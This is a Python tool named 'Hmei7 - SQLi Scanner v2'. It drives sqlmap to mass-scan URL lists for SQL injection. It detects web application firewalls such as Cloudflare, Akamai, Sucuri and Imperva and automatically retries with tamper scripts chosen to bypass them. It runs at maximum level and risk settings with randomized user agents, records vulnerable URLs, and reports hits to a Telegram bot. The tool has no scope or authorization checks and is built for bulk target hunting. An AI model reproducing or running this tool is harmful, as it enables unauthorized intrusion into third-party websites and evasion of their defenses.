#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Hmei7 - SQLi Scanner v2
Features:
- Async parallel scanning (global concurrency + per-domain semaphore)
- Auto WAF detect & dynamic tamper bypass
- Per-target detailed logs (logs/<target>.log)
- Resume mode (skip processed)
- Severity badges (High/Medium/Low) based on technique
- Futuristic real-time Rich dashboard (dark neon)
- Optional Telegram webhook notification on hits
- Clean CLI compatible with common sqlmap versions (no --stop-on-first)
"""

import argparse
import asyncio
import os
import re
import sys
import time
import json
import shlex
import signal
import hashlib
from pathlib import Path
from urllib.parse import urlparse
from datetime import datetime

# -------- UI (Rich) --------
try:
    from rich.live import Live
    from rich.table import Table
    from rich.panel import Panel
    from rich.align import Align
    from rich.layout import Layout
    from rich.text import Text
    from rich.console import Console, Group
    from rich.progress import Progress, BarColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn, TextColumn
    from rich.theme import Theme
except ImportError:
    print("Rich belum terpasang. Install dulu: pip install rich")
    sys.exit(1)

NEON = Theme({
    "primary": "bold magenta",
    "ok": "bold green",
    "warn": "bold yellow",
    "bad": "bold red",
    "muted": "grey70",
    "dim": "grey46",
    "badge.high": "bold red",
    "badge.med": "bold yellow",
    "badge.low": "bold green",
    "box": "magenta",
    "waf": "yellow",
})
console = Console(theme=NEON)

ASCII_TITLE = r"""
  _    _                _ ______      _____  ____  _      _ 
 | |  | |              (_)____  |    / ____|/ __ \| |    (_)
 | |__| |_ __ ___   ___ _    / /____| (___ | |  | | |     _ 
 |  __  | '_ ` _ \ / _ \ |  / /______\___ \| |  | | |    | |
 | |  | | | | | | |  __/ | / /       ____) | |__| | |____| |
 |_|  |_|_| |_| |_|\___|_|/_/       |_____/ \___\_\______|_|
                                                            
                                                            
"""

# Purple modern box title
def title_panel():
    inner = Text("Hmei7 - SQLi Scanner", style="primary")
    sub = Text("v2 • async • waf-bypass • neon-ui", style="muted")
    block = Group(Align.center(inner), Align.center(sub))
    return Panel.fit(
        block,
        title="",
        border_style="box",
        padding=(1, 8),
        subtitle="",
    )

def ascii_header():
    t = Text(ASCII_TITLE.strip("\n"), style="primary")
    return Panel(
        Align.center(t),
        border_style="magenta",
        padding=(1,2),
    )

# -------- Helpers --------
def sanitize_filename(s: str) -> str:
    s = re.sub(r"[^a-zA-Z0-9_.-]+", "_", s)
    return s[:120]

def domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.lower()
    except Exception:
        return "unknown"

def now_str():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def hash_short(s: str) -> str:
    return hashlib.sha1(s.encode()).hexdigest()[:10]

def ensure_dir(p: Path):
    p.mkdir(parents=True, exist_ok=True)

async def telegram_notify(token: str, chat_id: str, text: str):
    try:
        import aiohttp
    except ImportError:
        return
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=8) as r:
                _ = await r.text()
    except Exception:
        pass

# -------- WAF & Severity Parsing --------
WAF_HINTS = [
    "WAF/IDS", "Cloudflare", "Akamai", "Sucuri", "Imperva", "F5 BIG-IP",
    "WAF detected", "DDoS protection", "Incapsula"
]

WAF_TAMPER_PRESETS = {
    "cloudflare": ["between","space2comment","randomcase","charunicodeencode"],
    "akamai":     ["between","equaltolike","space2comment","charunicodeencode"],
    "sucuri":     ["between","space2comment","chardoubleencode","randomcase"],
    "imperva":    ["between","space2comment","charunicodeencode","randomcase"],
    "generic":    ["between","space2comment","randomcase","charunicodeencode"]
}

SEV_PATTERNS = {
    "HIGH":  [r"union-based", r"error-based", r"UNION query", r"stacked queries", r"file write"],
    "MED":   [r"boolean-based", r"time-based", r"blind SQL injection"],
}

def detect_waf(stdout: str) -> str|None:
    s = stdout.lower()
    if any(k.lower() in s for k in WAF_HINTS):
        if "cloudflare" in s:
            return "Cloudflare"
        if "akamai" in s:
            return "Akamai"
        if "sucuri" in s:
            return "Sucuri"
        if "imperva" in s:
            return "Imperva"
        return "Generic WAF"
    return None

def classify_severity(stdout: str) -> str:
    s = stdout.lower()
    for pat in SEV_PATTERNS["HIGH"]:
        if re.search(pat, s):
            return "HIGH"
    for pat in SEV_PATTERNS["MED"]:
        if re.search(pat, s):
            return "MED"
    if re.search(r"sql injection vulnerability", s):
        return "MED"
    return "LOW"

def build_sqlmap_cmd(url: str, args) -> list[str]:
    u = url.replace("FUZZ", "1")
    cmd = [
        "sqlmap",
        "-u", u,
        "--batch",
        "--level", str(args.level),
        "--risk", str(args.risk),
        "--technique", "BEU",
        "--random-agent",
        "--timeout", str(args.timeout),
        "--threads", str(args.sqlmap_threads),
        "--fresh-queries",
    ]
    if args.tamper:
        cmd += ["--tamper", args.tamper]
    if args.proxy:
        cmd += ["--proxy", args.proxy]
    if args.dbms:
        cmd += ["--dbms", args.dbms]
    return cmd

def build_bypass_cmd(base_cmd: list[str], waf_name: str) -> list[str]:
    waf_key = waf_name.lower()
    if "cloudflare" in waf_key:
        taps = WAF_TAMPER_PRESETS["cloudflare"]
    elif "akamai" in waf_key:
        taps = WAF_TAMPER_PRESETS["akamai"]
    elif "sucuri" in waf_key:
        taps = WAF_TAMPER_PRESETS["sucuri"]
    elif "imperva" in waf_key:
        taps = WAF_TAMPER_PRESETS["imperva"]
    else:
        taps = WAF_TAMPER_PRESETS["generic"]
    cmd = [c for c in base_cmd if not (c == "--tamper")]
    while "--tamper" in cmd:
        idx = cmd.index("--tamper")
        del cmd[idx:idx+2]
    cmd += ["--tamper", ",".join(taps)]
    return cmd

# -------- Scanner Core --------
class Scanner:
    def __init__(self, args):
        self.args = args
        self.out_file = Path(args.output)
        self.input_file = Path(args.input)
        self.logs_dir = Path("logs")
        ensure_dir(self.logs_dir)

        self.processed_file = Path(".processed.json")
        self.processed = self._load_processed()
        self.urls = self._load_urls()
        self.total = len(self.urls)
        self.start_time = time.time()
        
        self.ok = 0
        self.fail = 0
        self.vuln = 0
        self.waf_hits = 0

        self.global_sem = asyncio.Semaphore(args.concurrency)
        self.domain_sems = {}

        self.progress = Progress(
            SpinnerColumn(),
            TextColumn("[muted]{task.description}"),
            BarColumn(),
            TextColumn("[ok]{task.completed}[/ok]/[muted]{task.total}"),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            expand=True,
        )
        self.task_id = self.progress.add_task("Scanning", total=self.total)

        self.recent_logs = []
        self.out_file.touch(exist_ok=True)
        self.tg_token = args.telegram_token
        self.tg_chat = args.telegram_chat

    def _load_urls(self) -> list[str]:
        with self.input_file.open() as f:
            urls = [ln.strip() for ln in f if ln.strip()]
        urls = [u for u in urls if "?" in u and "=" in u]
        
        if self.args.resume:
            urls = [u for u in urls if u not in self.processed]
            
        return urls

    def _load_processed(self) -> set[str]:
        if self.processed_file.exists():
            try:
                return set(json.loads(self.processed_file.read_text()))
            except Exception:
                return set()
        return set()

    def _save_processed(self):
        try:
            self.processed_file.write_text(json.dumps(list(self.processed)))
        except Exception:
            pass

    def domain_sem(self, url: str) -> asyncio.Semaphore:
        d = domain_of(url)
        if d not in self.domain_sems:
            self.domain_sems[d] = asyncio.Semaphore(self.args.per_domain)
        return self.domain_sems[d]

    def log_line(self, line: str):
        self.recent_logs.append(line)
        if len(self.recent_logs) > 8:
            self.recent_logs.pop(0)

    async def run_sqlmap(self, cmd: list[str], log_path: Path) -> tuple[int, str, str]:
        self.log_line(f"[cmd] {' '.join(shlex.quote(c) for c in cmd)}")
        log_f = log_path.open("w", encoding="utf-8", errors="replace")
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout_bytes, stderr_bytes = await proc.communicate()
            stdout = stdout_bytes.decode(errors="replace")
            stderr = stderr_bytes.decode(errors="replace")

            ts = f"=== {now_str()} ===\n"
            log_f.write(ts)
            log_f.write(stdout)
            if stderr.strip():
                log_f.write("\n--- STDERR ---\n")
                log_f.write(stderr)
            return proc.returncode, stdout, stderr
        finally:
            log_f.close()

    async def scan_one(self, url: str):
        async with self.global_sem:
            async with self.domain_sem(url):
                self.log_line(f"[SCAN] {url}")

                base_cmd = build_sqlmap_cmd(url, self.args)
                parsed = urlparse(url)
                tag = sanitize_filename(f"{parsed.netloc}_{hash_short(url)}.log")
                log_path = self.logs_dir / tag

                rc, out, err = await self.run_sqlmap(base_cmd, log_path)

                waf_name = detect_waf(out + "\n" + err)
                found = bool(re.search(r"sql injection vulnerability", out, re.IGNORECASE))

                if waf_name and not found and self.args.waf_auto:
                    self.waf_hits += 1
                    self.log_line(f"[WAF DETECTED] {waf_name} -> retry with tamper")
                    cmd2 = build_bypass_cmd(base_cmd, waf_name)
                    rc, out2, err2 = await self.run_sqlmap(cmd2, log_path)
                    out += "\n" + out2
                    err += "\n" + err2
                    found = bool(re.search(r"sql injection vulnerability", out2, re.IGNORECASE))

                self.processed.add(url)
                self._save_processed()
                self.progress.advance(self.task_id, 1)

                if found:
                    self.vuln += 1
                    sev = classify_severity(out)
                    badge = {
                        "HIGH": "[badge.high]HIGH[/badge.high]",
                        "MED":  "[badge.med]MED[/badge.med]",
                        "LOW":  "[badge.low]LOW[/badge.low]",
                    }[sev]
                    with self.out_file.open("a") as f:
                        f.write(url + "\n")
                    self.log_line(f"[VULN {badge}] {url}")

                    if self.tg_token and self.tg_chat:
                        txt = f"🔥 Hmei7 - SQLi Scanner\nSeverity: {sev}\nURL: {url}"
                        await telegram_notify(self.tg_token, self.tg_chat, txt)

                else:
                    if waf_name:
                        self.log_line(f"[INFO] {url} - WAF present: {waf_name} (no vuln found)")
                    else:
                        self.log_line(f"[INFO] {url} - not vulnerable")

                if rc == 0:
                    self.ok += 1
                else:
                    self.fail += 1

    def build_layout(self) -> Layout:
        layout = Layout()
        layout.split(
            Layout(name="header", size=13),
            Layout(name="body", ratio=1),
            Layout(name="footer", size=7),
        )

        header_group = Group(
            ascii_header(),
            title_panel(),
        )
        layout["header"].update(header_group)

        stats = Table.grid(expand=True)
        stats.add_column(justify="left")
        stats.add_column(justify="center")
        stats.add_column(justify="right")

        stats.add_row(
            Text(f"Targets: {self.total}", style="muted"),
            Text(f"VULN: {self.vuln}", style="ok"),
            Text(f"WAF: {self.waf_hits}", style="waf"),
        )
        stats.add_row(
            Text(f"OK: {self.ok}", style="ok"),
            Text(f"FAIL: {self.fail}", style="bad"),
            Text(f"Elapsed: {int(time.time()-self.start_time)}s", style="muted")
        )

        body_panel = Panel(
            Group(
                stats,
                self.progress
            ),
            title="[primary]Scanning Status",
            border_style="magenta",
            padding=(1,2),
        )
        layout["body"].update(body_panel)

        log_tbl = Table.grid(expand=True)
        log_tbl.add_column("Recent", justify="left")
        for ln in self.recent_logs[-8:]:
            log_tbl.add_row(Text(ln, style="muted"))
        layout["footer"].update(
            Panel(log_tbl, title="[primary]Realtime Log", border_style="magenta", padding=(1,2))
        )
        return layout

    async def run(self):
        with Live(self.build_layout(), refresh_per_second=10, console=console) as live:
            self.progress.start()
            tasks = []
            for url in self.urls:
                tasks.append(asyncio.create_task(self.scan_one(url)))

            async def refresher():
                while any(not t.done() for t in tasks):
                    live.update(self.build_layout())
                    await asyncio.sleep(0.15)
                live.update(self.build_layout())

            await asyncio.gather(asyncio.create_task(refresher()), *tasks)
            self.progress.stop()

def parse_args():
    p = argparse.ArgumentParser(
        description="Hmei7 - SQLi Scanner v2 (async, WAF bypass, neon UI)"
    )
    p.add_argument("-i","--input", required=True, help="File input daftar URL")
    p.add_argument("-o","--output", required=True, help="File output URL vuln")
    p.add_argument("-c","--concurrency", type=int, default=16, help="Global concurrency")
    p.add_argument("--per-domain", type=int, default=4, help="Batas concurrency per domain")
    p.add_argument("--timeout", type=int, default=25, help="Timeout sqlmap")
    p.add_argument("--sqlmap-threads", type=int, default=1, help="--threads untuk sqlmap")
    p.add_argument("--level", type=int, default=5, help="Level scan sqlmap (default 5)")
    p.add_argument("--risk", type=int, default=3, help="Risk scan sqlmap (default 3)")
    p.add_argument("--tamper", default="", help="Tambahan tamper manual (opsional)")
    p.add_argument("--proxy", default="", help="Proxy upstream untuk sqlmap (http(s)://ip:port)")
    p.add_argument("--dbms", default="", help="Paksa DBMS tertentu (opsional)")
    p.add_argument("--waf-auto", action="store_true", help="Aktifkan auto WAF bypass retry")
    p.add_argument("--resume", action="store_true", help="Lewati URL yang sudah diproses (mode resume)")
    p.add_argument("--telegram-token", default="", help="Bot token Telegram (opsional)")
    p.add_argument("--telegram-chat", default="", help="Chat ID Telegram (opsional)")
    return p.parse_args()

def handle_sigint():
    console.print("\n[bad]Dihentikan oleh user.[/bad]")
    sys.exit(1)

def main():
    args = parse_args()
    signal.signal(signal.SIGINT, lambda *_: handle_sigint())

    if not Path(args.input).exists():
        console.print(f"[bad]Input file tidak ditemukan: {args.input}[/bad]")
        sys.exit(1)

    console.print("[muted]Starting...[/muted]")
    console.print("[muted]Tips: gunakan --waf-auto untuk bypass otomatis.[/muted]")
    try:
        sc = Scanner(args)
        asyncio.run(sc.run())
    except FileNotFoundError as e:
        if "sqlmap" in str(e):
            console.print("[bad]sqlmap tidak ditemukan di PATH. Install & pastikan bisa dipanggil dengan perintah `sqlmap`.[/bad]")
        else:
            console.print(f"[bad]{e}[/bad]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[bad]Error: {e}[/bad]")
        sys.exit(1)

if __name__ == "__main__":
    main()
